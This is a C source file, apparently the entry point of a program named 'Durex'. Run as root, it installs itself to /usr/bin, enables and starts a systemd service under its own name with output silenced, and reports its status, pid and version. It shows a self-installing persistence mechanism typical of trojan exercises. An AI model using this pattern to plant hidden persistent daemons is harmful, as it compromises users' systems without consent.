#include "durex.h"

int		build_status(void)
{
	char* process[] = { "Durex", NULL };

	if (processes_exists((char**)&process[0]) == true)
		return (1);
	return (0);
}

int		build_pid(void)
{
	char* process[] = { "Durex", NULL };

	int pid = processes_exists_pid((char**)&process[0]);

	printf("%d\n", pid);
	if (pid != -1)
		return (1);
	return (0);
}

int		build_version(void)
{
	printf("Durex Ver 1.0.0, for debian-linux-gnu (x86_64)\n");
	return (0);
}

const char *get_login()
{
	uid_t uid = geteuid();
	struct passwd *pw = getpwuid(uid);
	if (pw)
	{
		return pw->pw_name;
	}
	return "";
}

int		start_daemon(int argc, char **argv)
{
	(void)argc;
	(void)argv;
	char *const args1[] = {"/bin/systemctl", "enable","Durex.service",  NULL};
	char *const args2[] = {"/bin/systemctl", "start","Durex.service",  NULL};
	char *const args3[] = {"/usr/sbin/service", "Durex", "start", NULL};
	char *const env[] = { NULL };

	if (fork() == 0) {
		close(0);
		close(1);
		close(2);
		execve(args1[0], args1, env);
		exit(0);
	}
	wait(NULL);
	if (fork() == 0) {
		close(0);
		close(1);
		close(2);
		execve(args2[0], args2, env);
		exit(0);
	}
	wait(NULL);
	if (fork() == 0) {
		usleep(50000);//wait parent exit
		close(0);
		close(1);
		close(2);
		execve(args3[0], args3, env);
		exit(0);
	}
	return (0);
}

int		build_daemon(int argc, char **argv)
{
	BOOLEAN silence = false;

	for (int i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "status") == 0)
			return (build_status());
		if (strcmp(argv[i], "pid") == 0)
			return (build_pid());
		if (strcmp(argv[i], "version") == 0)
			return (build_version());
		if (strcmp(argv[i], " ") == 0)
			silence = true;
	}
	if (silence == false)
		printf("%s\n", get_login());
	if (build_status() == 1)
		return (0);
	if (strcmp(argv[0], "/usr/bin/Durex") != 0)
	{
		daemon_install();
		return (start_daemon(argc, argv));
	}
	if (file_exists("/var/lock/durex.lock") == true)
		return (0);
	return (durex_daemon(argv[0]));
}

int		has_root_rights(void)
{
	if (getuid() == 0)
		return (1);
	printf("%s\n", get_login());
	return (0);
}

int	main(int argc, char **argv)
{
	if (has_root_rights() == 0)
		return (0);
	return (build_daemon(argc, argv));
	return (0);
}
